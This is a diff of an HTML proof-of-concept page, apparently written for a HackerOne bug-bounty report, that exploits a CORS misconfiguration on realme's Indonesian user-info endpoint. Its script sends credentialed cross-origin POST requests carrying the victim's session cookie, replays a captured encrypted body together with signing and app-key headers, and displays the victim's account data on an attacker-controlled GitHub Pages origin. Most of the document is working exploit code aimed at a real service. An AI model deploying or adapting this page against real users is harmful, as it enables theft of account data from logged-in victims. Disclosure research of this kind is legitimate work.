@@ -1,84 +1,261 @@
 <!doctype html>
-<html lang="id">
+<html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <title>CORS Misconfiguration PoC - id-sg.realme.com</title>
+    <title>CORS PoC — id-sg.realme.com</title>
     <style>
-      body {
-        font-family: monospace;
-        background: #111;
-        color: #0f0;
-        padding: 20px;
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
       }
-      h3 {
-        color: #fff;
+      body {
+        font-family: "Courier New", monospace;
+        background: #0d0d0d;
+        color: #e0e0e0;
+        padding: 24px;
+      }
+      h2 {
+        color: #ff6b6b;
+        margin-bottom: 6px;
+        font-size: 1.1rem;
+      }
+      .meta {
+        color: #888;
+        font-size: 0.85rem;
+        margin-bottom: 20px;
+      }
+      .meta span {
+        color: #4fc3f7;
+      }
+      .box {
+        background: #1a1a1a;
+        border: 1px solid #333;
+        border-radius: 6px;
+        padding: 16px;
+        margin-bottom: 14px;
+      }
+      .box h3 {
+        color: #aaa;
+        font-size: 0.8rem;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        margin-bottom: 10px;
       }
       pre {
-        background: #000;
-        padding: 15px;
-        border: 1px solid #0f0;
+        font-size: 0.82rem;
         white-space: pre-wrap;
         word-break: break-all;
+        color: #c8e6c9;
+        line-height: 1.5;
       }
-      button {
-        padding: 8px 16px;
+      pre.error {
+        color: #ef9a9a;
+      }
+      pre.warn {
+        color: #ffe082;
+      }
+      .btn {
+        display: inline-block;
+        padding: 9px 22px;
+        background: #c62828;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
         cursor: pointer;
+        font-family: monospace;
+        font-size: 0.9rem;
+        margin-right: 10px;
+        margin-bottom: 14px;
+      }
+      .btn:hover {
+        background: #e53935;
+      }
+      .btn.sec {
+        background: #1565c0;
+      }
+      .btn.sec:hover {
+        background: #1976d2;
+      }
+      .tag {
+        display: inline-block;
+        padding: 2px 8px;
+        border-radius: 3px;
+        font-size: 0.75rem;
+        font-weight: bold;
+        margin-right: 6px;
+      }
+      .tag.red {
+        background: #c62828;
+        color: #fff;
+      }
+      .tag.grn {
+        background: #2e7d32;
+        color: #fff;
+      }
+      .tag.blu {
+        background: #1565c0;
+        color: #fff;
+      }
+      hr {
+        border: none;
+        border-top: 1px solid #333;
+        margin: 16px 0;
       }
     </style>
   </head>
   <body>
-    <h3>CORS Misconfiguration PoC — POST /uc/web/v1/user-info/query-basic</h3>
-    <p>
-      Target: <code>https://id-sg.realme.com</code> &nbsp;|&nbsp; Attacker
-      origin: <code>https://ikur007.github.io/Corspocrealme.html</code>
+    <h2>⚡ CORS Misconfiguration — id-sg.realme.com</h2>
+    <p class="meta">
+      Target:
+      <span>https://id-sg.realme.com/uc/web/v1/user-info/query-basic</span
+      ><br />
+      Attacker origin: <span>https://ikur007.github.io</span> &nbsp;|&nbsp;
+      Researcher: <span>HackerOne-ikur007</span>
     </p>
-    <button onclick="exploit()">Jalankan PoC</button>
-    <pre id="output">Klik tombol di atas untuk menjalankan request...</pre>
+
+    <div class="box">
+      <h3>⚠ Prerequisites</h3>
+      <pre class="warn">
+1. Buka https://id.realme.com di tab LAIN (browser yang sama) dan pastikan sudah login ke akun test realme.
+2. Kembali ke halaman ini, lalu klik tombol di bawah.
+3. Buka DevTools (F12) → Console untuk lihat detail CORS headers.</pre
+      >
+    </div>
+
+    <button class="btn" onclick="runExploit()">
+      ▶ Jalankan PoC (Fetch + Credentials)
+    </button>
+    <button class="btn sec" onclick="runPreflight()">
+      🔍 Cek Preflight OPTIONS saja
+    </button>
+
+    <div class="box" id="req-box" style="display: none">
+      <h3>📤 Request yang dikirim browser</h3>
+      <pre id="req-out"></pre>
+    </div>
+
+    <div class="box" id="res-box">
+      <h3>📥 Hasil</h3>
+      <pre id="output">Belum dijalankan.</pre>
+    </div>
 
     <script>
-      async function exploit() {
-        const output = document.getElementById("output");
-        output.textContent =
-          "Mengirim request cross-origin dengan credentials...";
+      const TARGET = "https://id-sg.realme.com/uc/web/v1/user-info/query-basic";
+
+      // Body asli dari capture Burp (JSON string — termasuk tanda kutip luar, sesuai Content-Type: application/json)
+      // Catatan: X-Sign + X-Requesttime sudah stale dari capture lama.
+      // Kalau server reject signature → ganti value ini dengan capture sesi terbaru dari Burp.
+      // Tapi CORS-nya sudah terbukti reflect origin dari Burp — "Failed to fetch" sebelumnya
+      // disebabkan X-Hackerone-Research header yang tidak ada di ACAH server, bukan karena body.
+      const BODY =
+        '"H1ON8P/Uqk8Oh016MPsESLO95VPD3r036Cjr0l6T48g+jKKAWWhShjbbWbE11hnjuYS5ned88WXFB999041FKrOjvHc8dy6h/JzU7LjTQmbSW6pPvkdPgoamAXu+lQGLMiG8Dr8VP6EtvwcJFlti5f+v+wCa9UbXLSwlh3dkLRA=.bt7gd4/oE43AB6EXrj9ZxlU0etM/kMpXDYGLHQjQn/US+2uR5TP6AaEHuFUTjo+Bs1fsbFZRsnG3i7ifEp2yA76vwPJc9vCGBKWKeKR++pt6u9/GFMopLTg9aYUXc2vfHo4P43w35xiNDce3zidYWCadA7QKjG+abPE4r8Tlah8=.MFg="';
+
+      function log(text, cls = "") {
+        const el = document.getElementById("output");
+        el.className = cls ? cls : "";
+        el.textContent = text;
+      }
+
+      async function runExploit() {
+        document.getElementById("res-box").style.display = "";
+        document.getElementById("req-box").style.display = "";
+
+        // Header yang HANYA ada di Access-Control-Allow-Headers server
+        // X-Hackerone-Research DIHAPUS — tidak ada di ACAH → bikin preflight fail
+        const headers = {
+          "Content-Type": "application/json;charset=UTF-8",
+          "X-Web-Client-Type": "pc",
+          "X-Timezone": "GMT+8",
+          "X-Requesttime": "1789221936829",
+          "X-Sign-Key": "4iAEb620alQ8s8c8ss8o0K8sS",
+          "X-Biz-Appkey": "TZeSXfQXxrCyjhvARaVrmw",
+          "X-App-Fromht": "false",
+          "X-Envelope-Version": "V1",
+          "X-App-Deviceid": "75d52dfb9b20039b676c8d55adbbb037",
+          "X-Device-Brand": "REALME",
+          "X-App-Overseaclient": "true",
+          "X-App-Acappkey": "CuGsbe6HdAe6vDBHFew2Di",
+          "X-Device-Clienttype": "WEB",
+          "X-Sign": "EbhHOn3R4iKv8Qv73383UDGz21s=",
+          "Accept-Language": "en-US",
+        };
+
+        document.getElementById("req-out").textContent =
+          `POST ${TARGET}\n` +
+          `Origin: (dikirim otomatis oleh browser = https://ikur007.github.io)\n` +
+          `credentials: include  ← browser akan attach cookie acIdAuthSession korban\n\n` +
+          Object.entries(headers)
+            .map(([k, v]) => `${k}: ${v}`)
+            .join("\n") +
+          `\n\nBody (352 bytes, envelope-encrypted):\n${BODY.substring(0, 60)}...`;
+
+        log(
+          "Mengirim request cross-origin dengan credentials...\n(Buka Console F12 untuk detail preflight)",
+        );
 
         try {
-          const res = await fetch(
-            "https://id-sg.realme.com/uc/web/v1/user-info/query-basic",
-            {
-              method: "POST",
-              credentials: "include", // wajib: memaksa browser kirim cookie sesi korban
-              headers: {
-                "Content-Type": "application/json;charset=UTF-8",
-                "X-Hackerone-Research": "HackerOne-ikur007",
-                // Catatan: header custom lain (X-Sign, X-App-Deviceid, dll) di request asli
-                // adalah signature/anti-tamper buatan client-side JS realme, BUKAN bagian
-                // proteksi CORS. Untuk PoC minimal, cukup buktikan response-nya bisa terbaca
-                // lintas origin — tidak wajib meniru semua header itu.
-              },
-              // Body asli hasil capture Burp lo — ini payload envelope-encrypted (X-Envelope-Version: V1),
-              // bukan JSON biasa. Dikirim apa adanya (replay) karena kita tidak perlu tahu isinya untuk
-              // membuktikan CORS misconfig; kita cuma perlu server menerimanya & browser attacker bisa
-              // baca response-nya.
-              // CATATAN: request ini terikat X-Sign + waktu capture (X-Requesttime) dan cookie sesi
-              // acIdAuthSession lo saat itu. Kalau server validasi freshness/signature ketat, replay
-              // bisa gagal (misal error signature/timestamp) walau CORS-nya tetap kebukti reflect origin
-              // dari response header OPTIONS/actual request-nya. Kalau gagal, cukup screenshot response
-              // header ACAO+ACAC yang reflect origin attacker sebagai bukti primer.
-              body: '"H1ON8P/Uqk8Oh016MPsESLO95VPD3r036Cjr0l6T48g+jKKAWWhShjbbWbE11hnjuYS5ned88WXFB999041FKrOjvHc8dy6h/JzU7LjTQmbSW6pPvkdPgoamAXu+lQGLMiG8Dr8VP6EtvwcJFlti5f+v+wCa9UbXLSwlh3dkLRA=.bt7gd4/oE43AB6EXrj9Zxl U0etM/kMpXDYGLHQjQn/US+2uR5TP6AaEHuFUTjo+Bs1fsbFZRsnG3i7ifEp2yA76vwPJc9vCGBKWKeKR++pt6u9/GFMopLTg9aYUXc2vfHo4P43w35xiNDce3zidYWCadA7QKjG+abPE4r8Tlah8=.MFg="',
-            },
-          );
+          const res = await fetch(TARGET, {
+            method: "POST",
+            credentials: "include", // ← browser kirim cookie sesi korban
+            headers: headers,
+            body: BODY,
+          });
 
           const status = res.status;
-          const data = await res.text();
+          const acao = res.headers.get("Access-Control-Allow-Origin");
+          const acac = res.headers.get("Access-Control-Allow-Credentials");
+          const ct = res.headers.get("Content-Type");
+          const body_raw = await res.text();
 
-          output.textContent =
-            "HTTP Status: " +
-            status +
-            "\n\n" +
-            "Response berhasil dibaca dari origin lain (ikur007.github.io):\n\n" +
-            data;
+          log(
+            `╔══════════════════════════════════════════════════════════╗\n` +
+              `║  ✅ CORS BYPASS BERHASIL — RESPONSE TERBACA OLEH JS     ║\n` +
+              `╚══════════════════════════════════════════════════════════╝\n\n` +
+              `HTTP Status : ${status}\n` +
+              `ACAO Header : ${acao}   ← origin attacker direflect server\n` +
+              `ACAC Header : ${acac}   ← credentials diizinkan\n` +
+              `Content-Type: ${ct}\n\n` +
+              `Response Body (dibaca dari attacker origin ikur007.github.io):\n` +
+              `─────────────────────────────────────────────────────────────\n` +
+              body_raw,
+          );
         } catch (err) {
-          output.textContent = "Request gagal / diblokir browser: " + err;
+          log(
+            `❌ Request gagal: ${err}\n\n` +
+              `Kemungkinan penyebab:\n` +
+              `1. Sesi realme sudah expired — login ulang di tab lain, ulangi PoC\n` +
+              `2. Server reject X-Sign yang sudah stale — tangkap ulang request segar dari Burp\n` +
+              `   dan update nilai X-Requesttime + X-Sign di kode ini\n` +
+              `3. Cek Console (F12) untuk error CORS detail dari browser`,
+            "error",
+          );
+        }
+      }
+
+      async function runPreflight() {
+        document.getElementById("res-box").style.display = "";
+        log("Mengirim OPTIONS preflight manual ke target...");
+        try {
+          // GET sederhana untuk cek apakah server reachable + CORS headers-nya
+          const res = await fetch(TARGET, {
+            method: "OPTIONS",
+            credentials: "include",
+          });
+          const acao = res.headers.get("Access-Control-Allow-Origin");
+          const acac = res.headers.get("Access-Control-Allow-Credentials");
+          const acam = res.headers.get("Access-Control-Allow-Methods");
+          const acah = res.headers.get("Access-Control-Allow-Headers");
+          log(
+            `OPTIONS ${TARGET}\n` +
+              `Status: ${res.status}\n\n` +
+              `Access-Control-Allow-Origin      : ${acao}\n` +
+              `Access-Control-Allow-Credentials : ${acac}\n` +
+              `Access-Control-Allow-Methods     : ${acam}\n` +
+              `Access-Control-Allow-Headers     : ${acah}`,
+          );
+        } catch (e) {
+          log(`OPTIONS gagal: ${e}\nCek Console F12.`, "error");
         }
       }
     </script>
